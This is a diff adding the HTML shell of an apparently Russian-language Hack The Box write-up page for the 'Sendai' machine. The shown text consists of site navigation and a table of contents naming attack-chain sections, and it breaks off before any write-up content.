@@ -1,0 +1,1798 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://bdk44.github.io/windows/sendai/">
+      
+      
+        <link rel="prev" href="../administrator/">
+      
+      
+        <link rel="next" href="../../linux/cherryblossom/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../bdk_favicon.webp">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>HTB: Sendai (Medium) - .bdk writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title=".bdk writeups" class="md-header__button md-logo" aria-label=".bdk writeups" data-md-component="logo">
+      
+  <img src="../../wr_logo.webp" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            .bdk writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              HTB: Sendai (Medium)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Переключить на тёмную тему" type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Переключить на тёмную тему" for="__palette_1" hidden="">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7M9 21v-1h6v1a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1m3-17a5 5 0 0 0-5 5c0 2.05 1.23 3.81 3 4.58V16h4v-2.42c1.77-.77 3-2.53 3-4.58a5 5 0 0 0-5-5"></path></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Переключить на светлую тему" type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Переключить на светлую тему" for="__palette_0" hidden="">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 0-7 7c0 2.38 1.19 4.47 3 5.74V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.26c1.81-1.27 3-3.36 3-5.74a7 7 0 0 0-7-7M9 21a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1H9z"></path></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required="">
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix="">
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title=".bdk writeups" class="md-nav__button md-logo" aria-label=".bdk writeups" data-md-component="logo">
+      
+  <img src="../../wr_logo.webp" alt="logo">
+
+    </a>
+    .bdk writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix="">
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏡 Главная
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked="">
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📑 Райтапы
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📑 Райтапы
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked="">
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🪟 Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🪟 Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../administrator/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m22.51 6.457.001-.013a.89.89 0 0 0-.271-.638l-.027-.024q-.028-.025-.057-.048-.03-.022-.06-.04l-.029-.02-9.61-5.547a.89.89 0 0 0-.922.004L1.933 5.674l-.03.02-.023.014-.02.015a1 1 0 0 0-.147.134l-.003.003a.9.9 0 0 0-.221.584v.014l-.001.027v11.07c0 .328.18.63.469.784l9.599 5.542.023.011a1 1 0 0 0 .166.07l.04.01.072.015q.018.004.035.006a.8.8 0 0 0 .216 0q.018-.002.035-.006l.072-.014.04-.012.064-.022a1 1 0 0 0 .102-.047l.023-.011 9.599-5.542a.89.89 0 0 0 .469-.784V6.478zM5.255 6.082l6.537-3.774a.42.42 0 0 1 .418 0l6.537 3.774a.418.418 0 0 1 0 .725l-6.537 3.774a.42.42 0 0 1-.418 0L5.254 6.807a.418.418 0 0 1 0-.725m5.614 14.345a.417.417 0 0 1-.626.361l-6.524-3.766a.42.42 0 0 1-.209-.361V9.127a.417.417 0 0 1 .626-.361l6.524 3.766a.42.42 0 0 1 .209.362zm9.623-3.766a.42.42 0 0 1-.209.36l-6.524 3.767a.417.417 0 0 1-.626-.36v-7.533c0-.15.08-.287.209-.362l6.524-3.766a.417.417 0 0 1 .626.36z"></path></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB: Administrator (Medium)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m22.51 6.457.001-.013a.89.89 0 0 0-.271-.638l-.027-.024q-.028-.025-.057-.048-.03-.022-.06-.04l-.029-.02-9.61-5.547a.89.89 0 0 0-.922.004L1.933 5.674l-.03.02-.023.014-.02.015a1 1 0 0 0-.147.134l-.003.003a.9.9 0 0 0-.221.584v.014l-.001.027v11.07c0 .328.18.63.469.784l9.599 5.542.023.011a1 1 0 0 0 .166.07l.04.01.072.015q.018.004.035.006a.8.8 0 0 0 .216 0q.018-.002.035-.006l.072-.014.04-.012.064-.022a1 1 0 0 0 .102-.047l.023-.011 9.599-5.542a.89.89 0 0 0 .469-.784V6.478zM5.255 6.082l6.537-3.774a.42.42 0 0 1 .418 0l6.537 3.774a.418.418 0 0 1 0 .725l-6.537 3.774a.42.42 0 0 1-.418 0L5.254 6.807a.418.418 0 0 1 0-.725m5.614 14.345a.417.417 0 0 1-.626.361l-6.524-3.766a.42.42 0 0 1-.209-.361V9.127a.417.417 0 0 1 .626-.361l6.524 3.766a.42.42 0 0 1 .209.362zm9.623-3.766a.42.42 0 0 1-.209.36l-6.524 3.767a.417.417 0 0 1-.626-.36v-7.533c0-.15.08-.287.209-.362l6.524-3.766a.417.417 0 0 1 .626.36z"></path></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB: Sendai (Medium)
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m22.51 6.457.001-.013a.89.89 0 0 0-.271-.638l-.027-.024q-.028-.025-.057-.048-.03-.022-.06-.04l-.029-.02-9.61-5.547a.89.89 0 0 0-.922.004L1.933 5.674l-.03.02-.023.014-.02.015a1 1 0 0 0-.147.134l-.003.003a.9.9 0 0 0-.221.584v.014l-.001.027v11.07c0 .328.18.63.469.784l9.599 5.542.023.011a1 1 0 0 0 .166.07l.04.01.072.015q.018.004.035.006a.8.8 0 0 0 .216 0q.018-.002.035-.006l.072-.014.04-.012.064-.022a1 1 0 0 0 .102-.047l.023-.011 9.599-5.542a.89.89 0 0 0 .469-.784V6.478zM5.255 6.082l6.537-3.774a.42.42 0 0 1 .418 0l6.537 3.774a.418.418 0 0 1 0 .725l-6.537 3.774a.42.42 0 0 1-.418 0L5.254 6.807a.418.418 0 0 1 0-.725m5.614 14.345a.417.417 0 0 1-.626.361l-6.524-3.766a.42.42 0 0 1-.209-.361V9.127a.417.417 0 0 1 .626-.361l6.524 3.766a.42.42 0 0 1 .209.362zm9.623-3.766a.42.42 0 0 1-.209.36l-6.524 3.767a.417.417 0 0 1-.626-.36v-7.533c0-.15.08-.287.209-.362l6.524-3.766a.417.417 0 0 1 .626.36z"></path></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB: Sendai (Medium)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+  
+
+<nav class="md-nav md-nav--secondary" aria-label="Оглавление">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Оглавление
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Резюме
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Цепочка атаки
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitre-attck-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MITRE ATT&amp;CK MAPPING
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1046-t1039-t1087002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Разведка и сбор данных — T1046, T1039, T1087.002
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1078002-t1069002-t1098-t1021006" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Получение начального доступа, перечисление домена и первый флаг — T1078.002, T1069.002, T1098, T1021.006
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1007-t1552002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Локальное перечисление сервисов и извлечение учетных данных — T1007, T1552.002
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ad-cs-t1649-t1550002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Эксплуатация AD CS, компрометация домена и второй флаг — T1649, T1550.002
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Извлеченные уроки
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Источники
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2">
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🐧 Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🐧 Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/cherryblossom/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.5 4.5 0 0 0-1.68-.69 5.22 5.22 0 0 1 5.096-4.104 5.22 5.22 0 0 1 5.174 4.57 5 5 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.25 3.25 0 0 1 1.912-.616 3.28 3.28 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.53 4.53 0 0 0-4.428-3.61 4.5 4.5 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0m5.192 10.64a.9.9 0 0 0-.462.108.9.9 0 0 0-.313.29 1.3 1.3 0 0 0-.175.427 2.4 2.4 0 0 0-.054.514q0 .271.054.517.055.246.175.43a.9.9 0 0 0 .313.297q.19.11.462.11.27 0 .46-.11a.9.9 0 0 0 .309-.296q.12-.185.173-.431.054-.246.054-.517 0-.27-.054-.514a1.3 1.3 0 0 0-.173-.426.9.9 0 0 0-.309-.291.9.9 0 0 0-.46-.108m6.486 0a.9.9 0 0 0-.462.108.9.9 0 0 0-.313.29 1.3 1.3 0 0 0-.175.427 2.4 2.4 0 0 0-.053.514q0 .271.053.517.055.246.175.43a.9.9 0 0 0 .313.297q.19.11.462.11.27 0 .46-.11a.9.9 0 0 0 .31-.296q.117-.185.172-.431t.054-.517q0-.27-.054-.514a1.3 1.3 0 0 0-.173-.426.9.9 0 0 0-.308-.291.9.9 0 0 0-.461-.108m-8.537.068-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445q.119 0 .193.084.074.085.114.21.039.125.054.269a2.5 2.5 0 0 1 0 .533q-.015.145-.054.27a.6.6 0 0 1-.114.21.24.24 0 0 1-.193.085.25.25 0 0 1-.195-.086.6.6 0 0 1-.118-.209 1.3 1.3 0 0 1-.056-.27 2.7 2.7 0 0 1 0-.533q.015-.144.056-.27a.6.6 0 0 1 .118-.209.25.25 0 0 1 .195-.084m6.486 0q.12 0 .193.084.074.085.114.21t.054.269a2.5 2.5 0 0 1 0 .533q-.014.145-.054.27a.6.6 0 0 1-.114.21.24.24 0 0 1-.193.085.25.25 0 0 1-.195-.086.6.6 0 0 1-.117-.209 1.3 1.3 0 0 1-.056-.27 2.6 2.6 0 0 1 0-.533q.014-.144.056-.27a.6.6 0 0 1 .117-.209.25.25 0 0 1 .195-.084m-2.191 3.51a.93.93 0 0 0-.463.109.9.9 0 0 0-.312.291q-.12.182-.175.426a2.4 2.4 0 0 0-.054.514q0 .27.054.516t.175.432a.9.9 0 0 0 .312.296.9.9 0 0 0 .463.11q.27 0 .46-.11a.9.9 0 0 0 .308-.296 1.3 1.3 0 0 0 .174-.432q.054-.245.054-.516 0-.27-.054-.514a1.3 1.3 0 0 0-.174-.426.9.9 0 0 0-.309-.291.9.9 0 0 0-.46-.108zm-6.402.07-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443q.12 0 .194.085a.6.6 0 0 1 .114.21q.04.124.053.269a2.6 2.6 0 0 1 0 .532 1.3 1.3 0 0 1-.053.27.6.6 0 0 1-.114.21.24.24 0 0 1-.193.085.25.25 0 0 1-.196-.085.6.6 0 0 1-.117-.21 1.3 1.3 0 0 1-.056-.27 2.6 2.6 0 0 1 0-.532q.014-.145.056-.27a.6.6 0 0 1 .117-.209.25.25 0 0 1 .196-.085zm-6.729 3.073a.7.7 0 0 0-.335.078.66.66 0 0 0-.227.211.9.9 0 0 0-.127.31q-.04.177-.04.373c0 .196.013.256.04.375a.9.9 0 0 0 .127.313.65.65 0 0 0 .227.215q.138.08.335.08a.66.66 0 0 0 .334-.08.65.65 0 0 0 .225-.215q.086-.135.125-.313a1.8 1.8 0 0 0 .04-.375q0-.195-.04-.373a.9.9 0 0 0-.125-.31.66.66 0 0 0-.225-.21.67.67 0 0 0-.334-.08zm3.086 0a.7.7 0 0 0-.336.078.66.66 0 0 0-.226.211.9.9 0 0 0-.127.31 1.7 1.7 0 0 0-.04.373q0 .197.04.375a.9.9 0 0 0 .127.313q.088.135.226.215.14.08.336.08a.66.66 0 0 0 .334-.08.65.65 0 0 0 .224-.215q.087-.135.126-.313a1.75 1.75 0 0 0 0-.748 1 1 0 0 0-.126-.31.66.66 0 0 0-.224-.21.67.67 0 0 0-.334-.08zm5.108 0a.7.7 0 0 0-.336.078.66.66 0 0 0-.226.211.9.9 0 0 0-.127.31q-.04.177-.04.373c0 .196.013.256.04.375a.9.9 0 0 0 .127.313q.087.135.226.215.14.08.336.08t.334-.08a.65.65 0 0 0 .224-.215q.087-.135.126-.313a1.8 1.8 0 0 0 .04-.375q0-.195-.04-.373a1 1 0 0 0-.126-.31.66.66 0 0 0-.224-.21.67.67 0 0 0-.334-.08zm-6.658.05-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322q.087 0 .14.062a.4.4 0 0 1 .083.151 1 1 0 0 1 .04.196 2 2 0 0 1 0 .386 1 1 0 0 1-.04.197.4.4 0 0 1-.083.152.18.18 0 0 1-.14.061.18.18 0 0 1-.141-.06.4.4 0 0 1-.085-.153 1 1 0 0 1-.041-.197 2 2 0 0 1 0-.386 1 1 0 0 1 .04-.196.4.4 0 0 1 .086-.151.18.18 0 0 1 .141-.062m3.086 0q.086 0 .14.062a.4.4 0 0 1 .082.151 1 1 0 0 1 .04.196 2 2 0 0 1 0 .386 1 1 0 0 1-.04.197.4.4 0 0 1-.082.152.18.18 0 0 1-.14.061.18.18 0 0 1-.141-.06.4.4 0 0 1-.086-.153 1 1 0 0 1-.04-.197 2 2 0 0 1-.011-.195q0-.086.01-.191a1 1 0 0 1 .041-.196.4.4 0 0 1 .086-.151.18.18 0 0 1 .141-.062m5.108 0q.087 0 .14.062a.4.4 0 0 1 .082.151 1 1 0 0 1 .04.196 2 2 0 0 1 0 .386 1 1 0 0 1-.04.197.4.4 0 0 1-.082.152.18.18 0 0 1-.14.061.18.18 0 0 1-.142-.06.4.4 0 0 1-.085-.153 1 1 0 0 1-.04-.197 2 2 0 0 1-.011-.195q0-.086.01-.191a1 1 0 0 1 .04-.196.5.5 0 0 1 .086-.151.18.18 0 0 1 .142-.062m-1.684 1.814a.7.7 0 0 0-.336.079.66.66 0 0 0-.227.21.9.9 0 0 0-.127.31 1.7 1.7 0 0 0 0 .748 1 1 0 0 0 .127.314q.088.135.227.215.14.08.336.08a.66.66 0 0 0 .334-.08.65.65 0 0 0 .224-.215q.087-.135.126-.314a1.7 1.7 0 0 0-.001-.747.9.9 0 0 0-.125-.31.65.65 0 0 0-.224-.211.67.67 0 0 0-.334-.079m3.063 0a.7.7 0 0 0-.336.079.7.7 0 0 0-.227.21.9.9 0 0 0-.127.31 1.7 1.7 0 0 0 0 .748.9.9 0 0 0 .127.314.66.66 0 0 0 .227.215q.138.08.336.08a.65.65 0 0 0 .334-.08.65.65 0 0 0 .223-.215q.087-.135.126-.314a1.7 1.7 0 0 0 0-.747.9.9 0 0 0-.126-.31.65.65 0 0 0-.223-.211.67.67 0 0 0-.334-.079m-1.545.05-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323q.086 0 .14.061a.4.4 0 0 1 .082.152 1 1 0 0 1 .04.195 2 2 0 0 1 0 .387 1 1 0 0 1-.04.197.4.4 0 0 1-.082.152.18.18 0 0 1-.14.06.18.18 0 0 1-.142-.06.4.4 0 0 1-.085-.152 1 1 0 0 1-.04-.197 2 2 0 0 1-.011-.195q0-.087.01-.192a1 1 0 0 1 .041-.195q.03-.09.085-.152a.18.18 0 0 1 .142-.061m3.063 0q.086 0 .14.061a.4.4 0 0 1 .082.152 1 1 0 0 1 .04.195 2 2 0 0 1 0 .387 1 1 0 0 1-.04.197.4.4 0 0 1-.083.152.18.18 0 0 1-.14.06.18.18 0 0 1-.141-.06.4.4 0 0 1-.085-.152 1 1 0 0 1-.04-.197 2 2 0 0 1 0-.387 1 1 0 0 1 .04-.195q.03-.09.085-.152a.18.18 0 0 1 .142-.061m-9.713.185a.47.47 0 0 0-.232.055.46.46 0 0 0-.157.146.6.6 0 0 0-.089.215 1.2 1.2 0 0 0-.027.259q0 .135.027.26a.7.7 0 0 0 .089.216q.06.094.157.149a.46.46 0 0 0 .232.056q.136-.001.231-.056a.45.45 0 0 0 .156-.149.7.7 0 0 0 .087-.217 1.2 1.2 0 0 0 0-.518.7.7 0 0 0-.087-.215.45.45 0 0 0-.156-.146.46.46 0 0 0-.23-.055zm1.052.035-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224q.06 0 .097.042a.3.3 0 0 1 .057.105.7.7 0 0 1 .028.136q.006.073.007.133 0 .06-.007.135a.7.7 0 0 1-.028.136.3.3 0 0 1-.057.105.12.12 0 0 1-.097.043.13.13 0 0 1-.098-.043.3.3 0 0 1-.059-.105.6.6 0 0 1-.028-.136 1.4 1.4 0 0 1 0-.268.6.6 0 0 1 .028-.136.3.3 0 0 1 .06-.105.13.13 0 0 1 .097-.042m3.775 1.394a.46.46 0 0 0-.232.054.45.45 0 0 0-.157.146.6.6 0 0 0-.088.214 1.2 1.2 0 0 0 0 .519.6.6 0 0 0 .088.217.46.46 0 0 0 .157.15.46.46 0 0 0 .232.054.45.45 0 0 0 .232-.055.45.45 0 0 0 .155-.149.7.7 0 0 0 .087-.217 1.2 1.2 0 0 0 0-.519.6.6 0 0 0-.087-.214.45.45 0 0 0-.155-.146.46.46 0 0 0-.232-.054m1.052.034-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223q.06 0 .098.043a.3.3 0 0 1 .057.105.6.6 0 0 1 .027.135 1.3 1.3 0 0 1 0 .268.7.7 0 0 1-.027.137.3.3 0 0 1-.057.105.12.12 0 0 1-.098.042.13.13 0 0 1-.098-.042.3.3 0 0 1-.059-.105.6.6 0 0 1-.028-.137 1.4 1.4 0 0 1 0-.268.6.6 0 0 1 .028-.135.3.3 0 0 1 .06-.105.12.12 0 0 1 